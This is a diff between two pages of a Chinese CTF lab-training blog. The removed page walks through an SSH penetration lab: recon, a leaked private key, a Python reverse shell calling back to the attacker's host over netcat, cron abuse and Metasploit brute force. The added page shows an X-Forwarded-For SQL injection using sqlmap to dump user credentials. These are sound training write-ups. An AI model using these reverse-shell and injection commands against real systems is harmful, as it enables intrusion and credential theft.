@@ -101,43 +101,26 @@
 
 
 
-  <meta name="description" content="Background  SSH 为 Secure Shell 的缩写，由 IETF 的网络小组（Network Working Group）所制定；SSH 为建立在应用层基础上的安全协议。SSH 是目前较可靠，专为远程登录会话和其他网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。">
-<meta name="keywords" content="CTF">
+  <meta name="description" content="Background  SQL注入攻击指的是通过构建特殊的输入作为参数传入Web应用程序，而这些输入的大都是SQL语法里的一些组合，通过执行SQL语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。">
+<meta name="keywords" content="CTF,SQL注入">
 <meta property="og:type" content="article">
-<meta property="og:title" content="CTF靶场训练-SSH服务渗透">
-<meta property="og:url" content="http://yoursite.com/2019/08/13/CTF靶场训练-SSH服务渗透/index.html">
+<meta property="og:title" content="CTF靶场训练-SQL注入（X-Forwarded-For注入）">
+<meta property="og:url" content="http://yoursite.com/2019/08/28/CTF靶场训练-SQL注入（X-Forwarded-For注入）/index.html">
 <meta property="og:site_name" content="Galiyy&#39;blog">
-<meta property="og:description" content="Background  SSH 为 Secure Shell 的缩写，由 IETF 的网络小组（Network Working Group）所制定；SSH 为建立在应用层基础上的安全协议。SSH 是目前较可靠，专为远程登录会话和其他网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。">
+<meta property="og:description" content="Background  SQL注入攻击指的是通过构建特殊的输入作为参数传入Web应用程序，而这些输入的大都是SQL语法里的一些组合，通过执行SQL语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http://yoursite.com/images/20190814/20190814104504.png">
-<meta property="og:image" content="http://yoursite.com/images/20190814/20190814110255.png">
-<meta property="og:image" content="http://yoursite.com/images/20190814/20190814110810.png">
-<meta property="og:image" content="http://yoursite.com/images/20190814/20190814111216.png">
-<meta property="og:image" content="http://yoursite.com/images/20190814/20190814111311.png">
-<meta property="og:image" content="http://yoursite.com/images/20190814/20190814112119.png">
-<meta property="og:image" content="http://yoursite.com/images/20190814/20190814112916.png">
-<meta property="og:image" content="http://yoursite.com/images/20190814/20190814113152.png">
-<meta property="og:image" content="http://yoursite.com/images/20190814/20190814113647.png">
-<meta property="og:image" content="http://yoursite.com/images/20190814/20190814114029.png">
-<meta property="og:image" content="http://yoursite.com/images/20190814/20190816190237.png">
-<meta property="og:image" content="http://yoursite.com/images/20190814/20190816202324.png">
-<meta property="og:image" content="http://yoursite.com/images/20190814/20190816202652.png">
-<meta property="og:image" content="http://yoursite.com/images/20190814/20190816205104.png">
-<meta property="og:image" content="http://yoursite.com/images/20190814/20190816210728.png">
-<meta property="og:image" content="http://yoursite.com/images/20190814/20190816211640.png">
-<meta property="og:image" content="http://yoursite.com/images/20190814/20190816211859.png">
-<meta property="og:image" content="http://yoursite.com/images/20190814/20190816212122.png">
-<meta property="og:image" content="http://yoursite.com/images/20190814/20190816222117.png">
-<meta property="og:image" content="http://yoursite.com/images/20190814/20190816223545.png">
-<meta property="og:image" content="http://yoursite.com/images/20190814/20190816224256.png">
-<meta property="og:image" content="http://yoursite.com/images/20190814/20190816224842.png">
-<meta property="og:image" content="http://yoursite.com/images/20190814/20190816225211.png">
-<meta property="og:image" content="http://yoursite.com/images/20190814/20190817140519.png">
-<meta property="og:updated_time" content="2019-08-17T06:05:47.094Z">
+<meta property="og:image" content="http://yoursite.com/images/20190828/20190828192145.png">
+<meta property="og:image" content="http://yoursite.com/images/20190828/20190828192714.png">
+<meta property="og:image" content="http://yoursite.com/images/20190828/20190828193016.png">
+<meta property="og:image" content="http://yoursite.com/images/20190828/20190828193310.png">
+<meta property="og:image" content="http://yoursite.com/images/20190828/20190828193754.png">
+<meta property="og:image" content="http://yoursite.com/images/20190828/20190828200646.png">
+<meta property="og:image" content="http://yoursite.com/images/20190828/20190828202516.png">
+<meta property="og:updated_time" content="2019-08-28T12:30:02.481Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="CTF靶场训练-SSH服务渗透">
-<meta name="twitter:description" content="Background  SSH 为 Secure Shell 的缩写，由 IETF 的网络小组（Network Working Group）所制定；SSH 为建立在应用层基础上的安全协议。SSH 是目前较可靠，专为远程登录会话和其他网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。">
-<meta name="twitter:image" content="http://yoursite.com/images/20190814/20190814104504.png">
+<meta name="twitter:title" content="CTF靶场训练-SQL注入（X-Forwarded-For注入）">
+<meta name="twitter:description" content="Background  SQL注入攻击指的是通过构建特殊的输入作为参数传入Web应用程序，而这些输入的大都是SQL语法里的一些组合，通过执行SQL语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。">
+<meta name="twitter:image" content="http://yoursite.com/images/20190828/20190828192145.png">
 
 
 
@@ -145,7 +128,7 @@
 
   
   
-  <link rel="canonical" href="http://yoursite.com/2019/08/13/CTF靶场训练-SSH服务渗透/">
+  <link rel="canonical" href="http://yoursite.com/2019/08/28/CTF靶场训练-SQL注入（X-Forwarded-For注入）/">
 
 
 
@@ -155,7 +138,7 @@
   };
 </script>
 
-  <title>CTF靶场训练-SSH服务渗透 | Galiyy'blog</title>
+  <title>CTF靶场训练-SQL注入（X-Forwarded-For注入） | Galiyy'blog</title>
   
 
 
@@ -387,7 +370,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/13/CTF靶场训练-SSH服务渗透/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/28/CTF靶场训练-SQL注入（X-Forwarded-For注入）/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Galiyy">
@@ -404,7 +387,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">CTF靶场训练-SSH服务渗透
+          <h1 class="post-title" itemprop="name headline">CTF靶场训练-SQL注入（X-Forwarded-For注入）
 
               
             
@@ -430,23 +413,13 @@
                 
               
 
-              <time title="创建时间：2019-08-13 11:00:31" itemprop="dateCreated datePublished" datetime="2019-08-13T11:00:31+08:00">2019-08-13</time>
+              <time title="创建时间：2019-08-28 18:31:30 / 修改时间：20:30:02" itemprop="dateCreated datePublished" datetime="2019-08-28T18:31:30+08:00">2019-08-28</time>
             </span>
           
 
           
             
 
-            
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">更新于</span>
-                
-                <time title="修改时间：2019-08-17 14:05:47" itemprop="dateModified" datetime="2019-08-17T14:05:47+08:00">2019-08-17</time>
-              </span>
             
           
 
@@ -507,142 +480,57 @@
       
         <p><strong><em>Background</em></strong></p>
 <blockquote>
-<p>SSH 为 Secure Shell 的缩写，由 IETF 的网络小组（Network Working Group）所制定；SSH 为建立在应用层基础上的安全协议。SSH 是目前较可靠，专为远程登录会话和其他网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。</p>
+<p>SQL注入攻击指的是通过构建特殊的输入作为参数传入Web应用程序，而这些输入的大都是SQL语法里的一些组合，通过执行SQL语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。</p>
 </blockquote>
 <a id="more"></a>
 
-<p><font color="red"><strong>SSH是一般是基于TCP 22号端口的服务</strong></font></p>
-<h2 id="SSH协议认证机制"><a href="#SSH协议认证机制" class="headerlink" title="SSH协议认证机制"></a>SSH协议认证机制</h2><ul>
-<li><p><strong>基于口令的安全验证</strong><br>  &emsp;&emsp;只要你知道自己帐号和口令，就可以登录到远程主机。所有传输的数据都会被加密，但是不能保证你正在连接的服务器就是你想连接的服务器。可能会有别的服务器在冒充真正的服务器，也就是受到“中间人”这种方式的攻击。</p>
-</li>
-<li><p><strong>基于密匙的安全验证</strong><br>  &emsp;&emsp;需要依靠密匙，也就是你必须为自己创建一对密匙，并把公用密匙放在需要访问的服务器上。如果你要连接到SSH服务器上，客户端软件就会向服务器发出请求，请求用你的密匙进行安全验证。服务器收到请求之后，先在该服务器上你的主目录下寻找你的公用密匙，然后把它和你发送过来的公用密匙进行比较。如果两个密匙一致，服务器就用公用密匙加密“质询”（challenge）并把它发送给客户端软件。客户端软件收到“质询”之后就可以用你的私人密匙解密再把它发送给服务器。</p>
-<p>  用这种方式，你必须知道自己密匙的口令。但是，与第一种级别相比，第二种级别不需要在网络上传送口令。</p>
-<p>  <span style="background-color: yellow">一般id_rsa为私钥，id_rsa.pub为公钥；</span></p>
-</li>
-</ul>
-<h2 id="认证机制弱点"><a href="#认证机制弱点" class="headerlink" title="认证机制弱点"></a>认证机制弱点</h2><ul>
-<li><p><strong>基于口令的安全验证</strong><br>  &emsp;&emsp;基于字典的暴力破解，破解对应用户名和密码，通过SSH客户端连接到远程主机的SSH服务，实现对服务器的控制。（不一定是root权限）</p>
-</li>
-<li><p><strong>基于密匙的安全验证</strong><br>  &emsp;&emsp;通过对主机的信息收集获取到泄露的用户名和对应的密钥。</p>
-<p>  chmod 600 id_rsa<br>  ssh -i id_rsa 用户名@主机地址  登陆服务器。（不一定是root权限）</p>
-</li>
-</ul>
-<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>攻击机：Kali - 192.168.0.105<br>靶场机器： linux - 192.168.0.107</p>
-<p><strong>目的</strong>： 获取靶机root权限</p>
-<h2 id="信息探测"><a href="#信息探测" class="headerlink" title="信息探测"></a>信息探测</h2><p>对于给定IP地址的靶场机器，对其进行渗透测试，首先需要考虑靶场机器开放的服务。</p>
+<p>任何一个用户可以输入的位置都肯是注入点。比如url中，以及http报文中，头部参数；</p>
+<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>X-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。<font color="red">简单的来说，就是服务器端用来获取客户端真实IP的字段。</font></p>
+<p>X-Forwarded-For格式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: client1, proxy1, proxy2</span><br></pre></td></tr></table></figure>
+
+<p>X-Forwarded-For包含多个IP地址，每个值通过逗号+空格分开，最左边（client1）是最原始客户端的IP地址，中间如果有多层代理，每一层代理会将连接它的客户端IP追加在X-Forwarded-For右边。</p>
+<p>代理方向</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">客户端=&gt;正向代理=&gt;透明代理=&gt;服务器反向代理=&gt;Web服务器</span><br></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;一般的客户端（例如浏览器）发送HTTP请求是没有X-Forwarded-For头的，当请求到达第一个代理服务器时，代理服务器会加上X-Forwarded-For请求头，并将值设为客户端的IP地址（也就是最左边第一个值），后面如果还有多个代理，会依次将IP追加到X-Forwarded-For头最右边，最终请求到达Web应用服务器，应用通过获取X-Forwarded-For头取左边第一个IP即为客户端真实IP。</p>
+<p>X-Forwarded-For注入的实现原理：<span style="background-color: yellow"><strong>伪造X-Forwarded-For头部，头部内容包含恶意的sql语句</strong></span></p>
+<p><strong><em>参考博客</em></strong></p>
 <ul>
-<li><p>探测靶场开放的服务与服务的版本<br>  – nmap -sV 靶场IP地址</p>
+<li><p><a href="https://blog.csdn.net/zyhmz/article/details/82505344" target="_blank" rel="noopener">X-Forwarded-For的一些理解</a></p>
 </li>
-<li><p>探测靶场的全部信息<br>  – nmap -A -v 靶场IP地址</p>
+<li><p><a href="https://blog.csdn.net/xiao__gui/article/details/83054462" target="_blank" rel="noopener">利用X-Forwarded-For伪造客户端IP漏洞成因及防范</a></p>
 </li>
-<li><p>探测靶场的操作系统类型与版本<br>  – nmap -O 靶场IP地址</p>
-</li>
-</ul>
-<p><img src="/images/20190814/20190814104504.png" alt="image"></p>
-<p>发现目标靶机开放了http、ssh服务<br>对于ssh服务的22端口，首先考虑</p>
-<ul>
-<li>1.暴力破解</li>
-<li>2.私钥泄露（私钥有没有对应的密码、是否可以找到私钥的用户名）</li>
-</ul>
-<p>对于http服务的80端口或其他端口</p>
-<ul>
-<li>通过浏览器访问对应的http服务，如<a href="http://ip:port" target="_blank" rel="noopener">http://ip:port</a></li>
-<li>使用工具对目录进行探测，如dirb <a href="http://ip:port/" target="_blank" rel="noopener">http://ip:port/</a><br><font color="red"><strong>注意特殊的端口（大于1024）</strong></font></li>
-</ul>
-<p>挖掘敏感信息</p>
-<ul>
-<li>使用浏览器对靶场IP的http服务进行探测，对于页面展示的内容也要注意，尤其是联系人等信息（可能就是用户名）,递归访问，争取遍历到每一个目录</li>
-<li>尤其对robots.txt、以及一些目录的访问，挖掘具备利用价值的信息，对于开放ssh服务的靶机，要注意是否泄露了私钥（id_rsa）</li>
-</ul>
-<p><img src="/images/20190814/20190814110255.png" alt="image"><br>发现了一些联系人的信息（Martin、Hadi、Jimmy）</p>
-<p>对目录进行探测<br><img src="/images/20190814/20190814110810.png" alt="image"><br>发现了很多文件，通过网页进行访问<br><img src="/images/20190814/20190814111216.png" alt="image"><br><img src="/images/20190814/20190814111311.png" alt="image"><br>发现了私钥信息</p>
-<p>对于某些靶场，也可以通过nikto扫描器来挖掘敏感信息<br>– nikto -host 靶场IP</p>
-<p>特别注意config等特殊敏感文件<br><img src="/images/20190814/20190814112119.png" alt="image"></p>
-<h2 id="利用敏感、弱点信息"><a href="#利用敏感、弱点信息" class="headerlink" title="利用敏感、弱点信息"></a>利用敏感、弱点信息</h2><p>对挖掘到的ssh密钥利用</p>
-<ol>
-<li><p>修改id_rsa的权限</p>
-<p> chmod 600 id_rsa</p>
-</li>
-<li><p>利用私钥登陆服务器</p>
-<p> ssh -i id_rsa 用户名@靶场IP地址</p>
-</li>
-</ol>
-<p><font color="red"><strong>注意：如果id_rsa没有解密密码，可以直接使用。但是如果id_rsa有解密密码那么需要进行对应的破解</strong></font></p>
-<p>可以用wget将文件下载下来</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/test# wget http://192.168.0.107/icons/VDSoyuAXiO.txt</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/20190814/20190814112916.png" alt="image"></p>
-<p>修改文件名并赋予相应权限<br><img src="/images/20190814/20190814113152.png" alt="image"></p>
-<p>连接到靶机服务器（这里尝试使用联系人作为用户名）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/test# ssh -i id_rsa martin@192.168.0.107</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/20190814/20190814113647.png" alt="image"><br><img src="/images/20190814/20190814114029.png" alt="image"></p>
-<p><strong>扩大战果</strong><br>登陆服务器之后，我们可以做以下操作</p>
-<ol>
-<li>查看当前用户 whoami</li>
-<li>id 查看当前用户权限</li>
-<li>查看 根目录 寻找flag文件</li>
-</ol>
-<p>如果是root权限，那么表明这个靶场就被全部拿下。但是如果不是，就肯定需要提权。一般情况，flag文件只属于root用户和对应的用户组</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd 查看所有用户的列表</span><br><span class="line">cat /etc/group  查看用户组</span><br><span class="line">find / -user 用户名    查看属于某些用户的文件</span><br><span class="line">/tmp   查看缓冲文件目录</span><br></pre></td></tr></table></figure>
-
-<p>我们可以通过以上命令，尝试获取一些有用的信息</p>
-<h2 id="深入挖掘"><a href="#深入挖掘" class="headerlink" title="深入挖掘"></a>深入挖掘</h2><p>通过/etc/crontab文件，设定系统定期执行的任务，编辑，需要root权限。不同的用户都可以有不同的定时任务</p>
-<p>cat /etc/crontab  挖掘其他用户是否有定时任务，并查看对应的任务内容。执行的任务肯定对应靶场机器的某个文件。</p>
-<p>如果在/etc/crontab下有某个用户的定时计划文件，但是具体目录下没有这个定时的执行文件，可以自行创建反弹shell，然后netcat执行监听获取对应用户的权限。</p>
-<p>如果有定时执行的文件，可以切换到对应的目录，查看对应的权限，查看当前用户是否具有读写权限。</p>
-<p><strong>参考博客</strong></p>
-<ul>
-<li><a href="https://www.cnblogs.com/intval/p/5763929.html" target="_blank" rel="noopener">Linux定时任务Crontab命令详解</a></li>
-<li><a href="https://www.cnblogs.com/xd502djj/p/4292781.html" target="_blank" rel="noopener">/etc/crontab文件和crontab -e命令区别</a><br><img src="/images/20190814/20190816190237.png" alt="image"><br>查看定时执行文件，发现jimmy用户每5分钟会执行一次python脚本<br>但是在tmp目录下除一些隐藏文件外，并没有任何脚本<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">martin@debian:/tmp$ ls -al</span><br><span class="line">total 28</span><br><span class="line">drwxrwxrwt  7 root root 4096 août  16 13:05 .</span><br><span class="line">drwxr-xr-x 21 root root 4096 avril 26  2017 ..</span><br><span class="line">drwxrwxrwt  2 root root 4096 août  16 12:09 .font-unix</span><br><span class="line">drwxrwxrwt  2 root root 4096 août  16 12:09 .ICE-unix</span><br><span class="line">drwxrwxrwt  2 root root 4096 août  16 12:09 .Test-unix</span><br><span class="line">drwxrwxrwt  2 root root 4096 août  16 12:09 .X11-unix</span><br><span class="line">drwxrwxrwt  2 root root 4096 août  16 12:09 .XIM-unix</span><br></pre></td></tr></table></figure>
-
+<li><p><a href="https://blog.csdn.net/wqj975005563/article/details/80593063" target="_blank" rel="noopener">利用X-Forwarded-For进行sql注入</a></p>
 </li>
 </ul>
-<p>所以我们可以自行编写，再让它执行</p>
-<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>靶场代码</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> os,subprocess,socket</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">"192.168.0.105"</span>,<span class="number">4444</span>))</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">p = subprocess.call([<span class="string">"/bin/sh"</span>,<span class="string">"-i"</span>])</span><br></pre></td></tr></table></figure>
+<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><ul>
+<li>攻击机 Kali： 192.168.43.44</li>
+<li>靶场机器 Debian： 192.168.43.93</li>
+</ul>
+<h2 id="信息探测"><a href="#信息探测" class="headerlink" title="信息探测"></a>信息探测</h2><p>探测靶机开放服务及其版本<br>– nmap -sV 192.168.43.97<br><img src="/images/20190828/20190828192145.png" alt="image"></p>
+<p>【开放80端口http服务】</p>
+<p><strong>【Nginx是一款轻量级的Web 服务器/反向代理服务器及电子邮件（IMAP/POP3）代理服务器】</strong></p>
+<p>浏览器访问站点页面<br><img src="/images/20190828/20190828192714.png" alt="image"></p>
+<p>发现管理员登陆页面<br><img src="/images/20190828/20190828193016.png" alt="image"><br>尝试弱口令登陆失败</p>
+<h2 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h2><p>使用AWVS扫描站点漏洞<br>（AWVS是一款专业的Web扫描工具）<br>这里直接给出扫描结果<br><img src="/images/20190828/20190828193310.png" alt="image"><br><img src="/images/20190828/20190828193754.png" alt="image"><br>发现站点存在sql注入漏洞,可注入的参数X-Forwarded-For</p>
+<h2 id="数据库爆破"><a href="#数据库爆破" class="headerlink" title="数据库爆破"></a>数据库爆破</h2><p>既然知道存在sql注入漏洞<br>就可以用sql注入神器—-sqlmap<br>先做一个简单的探测<br>（-H +增加的头部 –batch 由系统默认参数）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.43.93&quot; -H &quot;x-forwarded-for:*&quot; --batch</span><br></pre></td></tr></table></figure>
 
-<p>攻击机netcat命令<br>– nc -lvp 为占用端口</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查看占用端口  netstat -pantu</span><br></pre></td></tr></table></figure>
+<p><img src="/images/20190828/20190828200646.png" alt="image"><br>果然存在漏洞<br>那么就好办了<br>跑数据库名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# sqlmap -u &quot;http://192.168.43.93&quot; -H &quot;x-forwarded-for:*&quot; --dbs --batch</span><br></pre></td></tr></table></figure>
 
-<p>可以通过netcat将脚本发到靶机 <a href="https://www.cnblogs.com/geloutingyu/p/9740213.html" target="_blank" rel="noopener">netcat传输文件用法</a></p>
-<p>先在本地启动发送命令<br>（直接发送给靶机会被防火墙，所以在本地开放端口，让靶机主动连接即可）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/test# nc -l 4445 &lt;1.py    //从本地打开4445端口发送文件，等待连接</span><br></pre></td></tr></table></figure>
+<p>跑数据库表名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# sqlmap -u &quot;http://192.168.43.93&quot; -H &quot;x-forwarded-for:*&quot; -D photoblog --tables --batch</span><br></pre></td></tr></table></figure>
 
-<p>靶机连接，下载文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">martin@debian:/tmp$ nc 192.168.0.105 4445 &gt;1.py  //连接kali，下载文件</span><br><span class="line">martin@debian:/tmp$ </span><br><span class="line">martin@debian:/tmp$ ls</span><br><span class="line">1.py</span><br><span class="line">martin@debian:/tmp$ cat 1.py </span><br><span class="line">#!/usr/bin/python</span><br><span class="line">import os,subprocess,socket</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((&quot;192.168.0.105&quot;,4444))</span><br><span class="line">os.dup2(s.fileno(),0)</span><br><span class="line">os.dup2(s.fileno(),1)</span><br><span class="line">os.dup2(s.fileno(),2)</span><br><span class="line">p = subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])</span><br><span class="line"></span><br><span class="line">martin@debian:/tmp$</span><br></pre></td></tr></table></figure>
+<p>跑列名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# sqlmap -u &quot;http://192.168.43.93&quot; -H &quot;x-forwarded-for:*&quot; -D photoblog -T users --columns --batch</span><br></pre></td></tr></table></figure>
 
-<p>然后kali监听4444端口<br><img src="/images/20190814/20190816202324.png" alt="image"><br>将1.py重命名为sekurity.py,并添加可执行权限<br><img src="/images/20190814/20190816202652.png" alt="image"><br>等待一段时间~
-<img src="/images/20190814/20190816205104.png" alt="image"><br>发现jimmy连接了我们的shell，但是很可惜jimmy也不是root权限，所以只能从最后一个用户Hadi入手</p>
-<h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><p>万不得已的时候 只能对ssh服务进行暴力破解。破解最后一个用户名。破解工具如hydra、medusa等。</p>
-<p>这里我们用cupp生成字典，再使用metasploit破解ssh</p>
-<p>cupp是生成的是社工字典，跟据输入的信息生成密码，（回车跳过输入）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/test# cupp3 -i     //-i 交互模式</span><br></pre></td></tr></table></figure>
+<p>跑字段</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# sqlmap -u &quot;http://192.168.43.93&quot; -H &quot;x-forwarded-for:*&quot; -D photoblog -T users -C login,password --dump --batch</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/20190814/20190816210728.png" alt="image"></p>
-<p>打开msf渗透测试框架</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/test# msfconsole</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/20190814/20190816211640.png" alt="image"></p>
-<p>这里要用到ssh_login模块，可以用search搜索</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; search ssh_login</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/20190814/20190816211859.png" alt="image"><br>use使用模块</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use auxiliary/scanner/ssh/ssh_login</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/20190814/20190816212122.png" alt="image"><br>显示配置项  show options</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf5 auxiliary(scanner/ssh/ssh_login) &gt; show option</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/20190814/20190816222117.png" alt="image"><br>配置相关选项</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msf5 auxiliary(scanner/ssh/ssh_login) &gt; set RHOSTS 192.168.0.107</span><br><span class="line">RHOSTS =&gt; 192.168.0.107</span><br><span class="line">msf5 auxiliary(scanner/ssh/ssh_login) &gt; set USERNAME hadi</span><br><span class="line">USERNAME =&gt; hadi</span><br><span class="line">msf5 auxiliary(scanner/ssh/ssh_login) &gt; set PASS_FILE hadi.txt</span><br><span class="line">PASS_FILE =&gt; hadi.txt</span><br><span class="line">msf5 auxiliary(scanner/ssh/ssh_login) &gt; set THREADS 10</span><br><span class="line">THREADS =&gt; 10</span><br><span class="line">msf5 auxiliary(scanner/ssh/ssh_login) &gt; show options </span><br><span class="line">msf5 auxiliary(scanner/ssh/ssh_login) &gt; run</span><br></pre></td></tr></table></figure>
-
-<p>破解出密码<br><img src="/images/20190814/20190816223545.png" alt="image"></p>
-<p>根据提示，打开session会话<br><img src="/images/20190814/20190816224256.png" alt="image"></p>
-<p>打开的session会话，交互模式不是很好<br>利用python进行优化</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&apos;/bin/bash&apos;)&quot;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/20190814/20190816224842.png" alt="image"></p>
-<p>提升权限，查看flag<br><img src="/images/20190814/20190816225211.png" alt="image"><br><img src="/images/20190814/20190817140519.png" alt="image"></p>
+<p><img src="/images/20190828/20190828202516.png" alt="image"></p>
+<p>获得管理员账号，就可以登陆后台了</p>
 
       
     </div>
@@ -671,6 +559,8 @@
           
             <a href="/tags/CTF/" rel="tag"># CTF</a>
           
+            <a href="/tags/SQL注入/" rel="tag"># SQL注入</a>
+          
         </div>
       
 
@@ -682,8 +572,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/08/07/CTF靶场训练-SSH私钥泄露/" rel="next" title="CTF靶场训练-SSH私钥泄露">
-                <i class="fa fa-chevron-left"></i> CTF靶场训练-SSH私钥泄露
+              <a href="/2019/08/27/CTF靶场训练-SQL注入（POST参数注入）/" rel="next" title="CTF靶场训练-SQL注入（POST参数注入）">
+                <i class="fa fa-chevron-left"></i> CTF靶场训练-SQL注入（POST参数注入）
               </a>
             
           </div>
@@ -691,10 +581,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/08/19/CTF靶场训练-SMB服务信息泄露/" rel="prev" title="CTF靶场训练-SMB服务信息泄露">
-                CTF靶场训练-SMB服务信息泄露 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -895,7 +781,7 @@
             
 
             
